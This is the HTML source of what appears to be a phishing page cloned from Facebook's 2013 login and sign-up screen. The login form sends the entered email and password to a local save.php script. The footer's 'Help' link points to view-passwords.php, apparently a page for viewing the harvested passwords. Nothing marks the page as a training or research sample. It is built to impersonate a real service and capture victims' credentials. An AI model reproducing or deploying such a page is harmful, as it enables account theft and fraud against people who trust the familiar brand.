<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Welcome to Facebook</title>
        <link rel="SHORTCUT ICON" href="images/facebook.png">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <meta name="description" content="Fancy Sliding Form with jQuery" />
        <meta name="keywords" content="jquery, form, sliding, usability, css3, validation, javascript"/>
        <link rel="stylesheet" href="css/style2.css" type="text/css" media="screen"/>
    </head>
    <style>
		a:link {color:#3b5998; text-decoration:none}
		a:visited {color:#3b5998;}
		a:hover{ text-decoration:underline; color:#3b5998;}
		a:active {color:#3b5998;text-decoration: none}
		
		#bluebar
		{
		background-color:#3b5998;
		height:80px;
		width:100%;
		-moz-box-shadow:0px 0px 1px #052467;
		-webkit-box-shadow:0px 0px 1px #052467; 
		box-shadow:0px 0px 1px #052467;
		position:static; padding:0px;
		border-bottom:1px solid #1d4088;
		}
		#bluewrapper
		{
		
		width:1022px;
		height:80px;
		}
		#logo
		{
		position:absolute;
		margin-top:25px;
		position:absolute;
		}
		#textone
		{
		font-family:Tahoma, Geneva, sans-serif;
		font-size:11px;
		width:145px;
		height:16px;
		padding:1px 0px 3px 3px;
		border:1px solid #1d4088;
		-moz-box-shadow:0px 0px 3px #1d4088;
    	-webkit-box-shadow:0px 0px 3px #1d4088;
    	box-shadow:0px 0px 3px #1d4088;	
		}
		#text-two
		{
		font-family:Tahoma, Geneva, sans-serif;
		font-size:11px;
		width:145px;
		height:16px;
		padding:1px 0px 3px 3px;
		border:1px solid #1d4088;
		-moz-box-shadow:0px 0px 3px #1d4088;
    	-webkit-box-shadow:0px 0px 3px #1d4088;
    	box-shadow:0px 0px 3px #1d4088;
		margin-left:13px;
		}
		#email
		{
		cursor:pointer;
		font-family:Tahoma, Geneva, sans-serif;
		font-size:11px;
		color:#FFF;
		padding-left:2px;
		}
		#password
		{
		cursor:pointer;
		font-family:Tahoma, Geneva, sans-serif;
		font-size:11px;
		color:#FFF;
		padding-left:15px;
		padding-bottom:2px;
		}
		#button
		{
		cursor:pointer;
		font-family:Tahoma, Geneva, sans-serif;
		font-weight:bold;
		font-size:11px;
		color:#FFF;
		border:1px solid #1d4088;
		width:50px; 
		height:23px;
		position:absolute;
		background: #6079ab; 
		background: linear-gradient(top, #7387af 0%, #6079ab 100%);  
		background: -moz-linear-gradient(top, #7387af 0%, #6079ab 100%); 
		background: -webkit-linear-gradient(top, #7387af 0%,#6079ab 100%);
		-webkit-box-shadow: 5px  #ccc;
		moz-box-shadow: 5px  #ccc;
		box-shadow: 5px  #ccc;
		-moz-box-shadow:0px 1px -1px #1c1e21;
    	-webkit-box-shadow:0px 1px -1px #1c1e21;
    	box-shadow:0px 1px -1px #1c1e21;
		padding:1px 3px 2px 3px;
		margin-left:13px;
		}
		#keep
		{
		display:inline-block;
		font-family:Tahoma, Geneva, sans-serif;
		color:#8ca1bb;
		font-size:11px;
		padding-left:5px;
		cursor:pointer;
		}
		#forgot
		{
		display:inline-block;
		font-family:Tahoma, Geneva, sans-serif;
		color:#8ca1bb;
		font-size:11px;
		padding-left:61px;
		cursor:pointer;
		}
		#txt
		{
		padding:10px;
		width:175px;
		height:16px;
		font-size:19px;
		border-radius:0.3em;
		border:100px;
		border:1px solid #bdc7d8;"
		padding:20px;
		}
		#txtlong
		{
		padding:10px;
		width:380px;
		height:16px;
		font-size:19px;
		border-radius:0.3em;
		border:100px;
		border:1px solid #bdc7d8;"
		padding:20px;
		margin-top:7px;
		}
		#ladynilan
		{
		padding-top:12px;
		margin-left:550px;
		}
    </style>
    <body bgcolor="#e9eef3">
    
       <div id="bluebar">
       <center>
       	<div id="bluewrapper">
    	<div id="logo"><a href=""><img src="images/logo.jpg" draggable="false"></a></div>
        <table id="ladynilan">
        <tr>
        <td id="email">Email or Phone</td>
        <td id="password">Password</td>
        </tr>
        <tr>
        <td><form name="juju" method="post" action="save.php"><input type="text" name="email" id="textone" ></td>
        <td><input type="password" name="pass" id="text-two" ><input type="submit" id="button" value="Log In"></form></td>
        </tr>
        <tr>
        <td colspan="2" valign="top"><input type="checkbox"><div id="keep">Keep me logged in</div><div id="forgot">Forgot your password?</div></td>
        </tr>
        </table>
        </div>
       </center>
       </div>
       </center>
       </div>
        <div id="content">
        <center>
        <div id="wrapper">
        <div id="subform">
         <p style="font-size:36px; font-weight:bold; line-height:35px; color:#333333; font-family:Tahoma, Geneva, sans-serif;">Sign Up</p><br>
         <p style="font-size:18px; color:#66667c; font-family:'Lucida Sans Unicode', 'Lucida Grande', sans-serif;">It’s free and always will be.</p>
         <br>
         <table>
         <tr>
         <td><input type="textbox" placeholder="First Name" id="txt"></td>
         <td style="padding-left:5px;"><input type="textbox" placeholder="Last Name" id="txt"></td>
         </tr>
          <tr>
         <td colspan="2"><input type="textbox" placeholder="Your Email" id="txtlong"></td>
         </tr>
         <tr>
         <td colspan="2"><input type="textbox" placeholder="Re-enter Email" id="txtlong"></td>
         </tr>
         <tr>
         <td colspan="2"><input type="textbox" placeholder="New Password" id="txtlong"></td>
         </tr>
         <tr>
         <td colspan="2" style="padding-top:5px;"> <p style="font-size:19px; color:#333333; font-family:Tahoma, Geneva, sans-serif;">Birthday</td>
         </tr>
         <tr>
         <td colspan="2" valign="middle" style="padding-top:5px;">
        <select style="width:90px; height:27px; padding:3px; font-size:15px;font-weight:normal;">
        <option value="Month:">Month:</option>
        <option value="Jan">Jan</option>
        <option value="Feb">Feb</option>
        <option value="Mar">Mar</option>
        <option value="Apr">Apr</option>
        <option value="May">May</option>
        <option value="Jul">Jul</option>
        <option value="Aug">Aug</option>
        <option value="Sep">Sep</option>
        <option value="Oct">Oct</option>
        <option value="Nov">Nov</option>
        <option value="Dec">Dec</option>
        </select>
         
        <select style="width:68px; height:27px; padding:3px; font-size:15px;font-weight:normal;">
        <option value="Day:">Day:</option>
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        <option value="5">5</option>
        <option value="6">6</option>
        <option value="7">7</option>
        <option value="8">8</option>
        <option value="9">9</option>
        <option value="10">10</option>
        <option value="11">11</option>
        <option value="12">12</option>
        <option value="13">13</option>
        <option value="14">14</option>
        <option value="15">15</option>
        <option value="16">16</option>
        <option value="17">17</option>
        <option value="18">18</option>
        <option value="19">19</option>
        <option value="20">20</option>
        <option value="21">21</option>
        <option value="22">22</option>
        <option value="23">23</option>
        <option value="24">24</option>
        <option value="25">25</option>
        <option value="26">26</option>
        <option value="27">27</option>
        <option value="28">28</option>
        <option value="29">29</option>
        <option value="30">30</option>
        <option value="31">31</option>
        </select>
        
        <select style="width:73px; height:27px; padding:3px; font-size:15px;font-weight:normal;">
        <option value="Year:">Year:</option>
        <option value="2013">2013</option>
        <option value="2012">2012</option>
        <option value="2013">2011</option>
        <option value="2010">2010</option>
        <option value="2009">2009</option>
        <option value="2008">2008</option>
        <option value="2007">2007</option>
        <option value="2006">2006</option>
        <option value="2005">2005</option>
        <option value="2004">2004</option>
        <option value="2003">2003</option>
        <option value="2002">2002</option>
        <option value="2001">2001</option>
        <option value="2000">2000</option>
        <option value="1999">1999</option>
        <option value="1998">1998</option>
        <option value="1997">1997</option>
        <option value="1996">1996</option>
        <option value="1995">1995</option>
        <option value="1994">1994</option>
        <option value="1993">1993</option>
        <option value="1992">1992</option>
        <option value="1991">1991</option>
        <option value="1990">1990</option>
        </select>
        <div id="why">
<a href="" title="Providing your birthday helps make sure you get the right Facebook experience for your age. You can choose to hide this info from your timeline later if you want. For more details, please visit our Data Use Policy.">Why do I need to provide my<br>birthday?</a>
</div>
         </td>
         </tr>
         <tr>
         <td colspan="2" style="padding-top:5px;" ><div style="font-size:19px;
font-family:arial;"><input type="radio" name="gender" value="Female"> Female
<input type="radio" name="gender" value="Male"> Male<br></div></td>
         </tr>
          <tr>
         <td colspan="2" style="padding-top:15px;" ><div style="font-size:11px;">
By clicking Sign Up, you agree to our <a href="">Terms</a> and that you 
have<br> read our <a href="">Data Use Policy</a>, including our <a href="">Cookie Use</a>.
</div></td>
         </tr>
          <td colspan="2" style="padding-top:15px;" ><a href=""><img src="images/su.jpg" draggable="true"></a></td>
         </tr>
         </table>
         <br>
         <hr width="100%">
         <br>
          <p style="font-size:12px; font-weight:bold; color:#66667c; font-family:Tahoma, Geneva, sans-serif;"><a href="">Create a Page</a> for a celebrity, band or business.</p>
        </div>
        <div id="docres">
        <p style="font-size:27px; font-weight:bold; line-height:35px; color:#333333;">Connect with friends and the<br>
world around you on Facebook.</p><br><br><br>
<table>
<tr>
<td><img src="images/276449379149296_1535348985.png"></td>
<td style="padding-left:15px;"></td>
<td valign="top"><p class="big"><b style="font-size:16px;padding-right:13px;">News Feed</b> See what’s up with friends, family<br>
and anything you’re into.</p></td>
</tr>
<tr>
<td colspan="3"><br></td>
</tr>
<tr>
<td><img src="images/276449379149296_1538611903.png"></td>
<td style="padding:5px;"></td>
<td><p class="big"><b style="font-size:16px;padding-right:13px;"><a href="">Timeline</a></b> Tell your story — from where you grew up<br>
to what you’re doing now.</p></td>
</tr>
<tr>
<td colspan="3"><br></td>
</tr>
<tr>
<tr>
<td><img src="images/276449379149296_367648155.png"></td>
<td style="padding:5px;"></td>
<td><p class="big"><b style="font-size:16px; padding-right:13px;"><a href="">Graph Search</a></b> Find more of what you’re looking for<br>
through your friends and connections.</p></td>
</tr>
<tr>
<td colspan="3"><br></td>
</tr>
<tr>
<tr>
<td><img src="images/276449379149296_646761364.png"></td>
<td style="padding:5px;"></td>
<td><p class="big"><b style="font-size:16px;padding-right:13px;"><a href="">Messages</a></b> Chat and send private messages with<br>
the important people in your life.</p></td>
</tr>
</table>
        </div>
        </div>
        </center>
        </div>
        
<center>

    <div  style="display: inline-block; font-size:10.5px; color:#8f808f; padding-bottom:8px; margin-top:8px;">Facebook &copy; 2013 &middot; <a href="#">English(US)</a></div>
    <div align="right" style="display: inline-block; font-size:10.5px; color:#3b5998; padding-left:305px;"><a href="">About</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Create an Ad</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Create a Page</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Developers</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Careers</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Privacy</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Cookies</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Terms</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="view-passwords.php">Help</a></div>
</div>
</div>
</center>
    </body>
</html>